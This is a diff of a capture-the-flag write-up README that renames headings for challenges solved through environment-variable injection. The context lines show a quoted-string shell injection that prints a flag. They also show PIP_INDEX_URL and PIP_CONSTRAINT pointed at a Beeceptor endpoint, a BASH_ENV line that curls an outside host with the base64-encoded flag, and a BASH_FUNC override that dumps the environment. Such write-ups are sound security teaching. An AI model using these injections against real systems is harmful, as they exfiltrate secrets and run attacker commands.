@@ -4,17 +4,17 @@
   <summary>Table of Contents</summary>
   <ol>
     <li>
-      <a href="#chall 1">Challenge 1</a>
+      <a href="#chall-1">Challenge 1</a>
     </li>
     <li>
-      <a href="#getting-started">Challenge 2</a>
+      <a href="#gchall-2">Challenge 2</a>
       <ul>
-        <li><a href="#prerequisites">Solution 1</a></li>
-        <li><a href="#installation">Solution 2</a></li>
+        <li><a href="#using-pip_index_url">Using PIP_INDEX_URL</a></li>
+        <li><a href="#using-pip_constraint">Using PIP_CONSTRAINT</a></li>
       </ul>
     </li>
     <li>
-      <a href="#getting-started">Challenge 2</a>
+      <a href="#chall-3">Challenge 2</a>
       <ul>
         <li><a href="#prerequisites">Solution 1</a></li>
         <li><a href="#installation">Solution 2</a></li>
@@ -35,7 +35,7 @@ Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
 
 
 # Chall 2
-## Solution 1
+## Using PIP_INDEX_URL
 > [!NOTE]
 > - [PIP environment variables doc](https://pip.pypa.io/en/latest/cli/pip_install/) PIP_<UPPER_LONG_NAME>
 > - [Pypi PyYAML](https://pypi.org/project/PyYAML/)
@@ -55,7 +55,7 @@ PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
 
 
 
-## Solution 2
+## Using PIP_CONSTRAINT
 > [!NOTE]
 > - [Beeceptor](https://beeceptor.com/)
 > - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
@@ -75,7 +75,7 @@ PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
 
 
 # Chall 3
-## Solution 1
+## Using BASH_ENV
 > [!NOTE]
 > - [Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
 > - [Beeceptor](https://beeceptor.com/)
@@ -90,7 +90,7 @@ BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base6
 
 
 
-## Solution 2
+## Using BASH_FUNC
 ``` bash
 Not a release :(
 BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
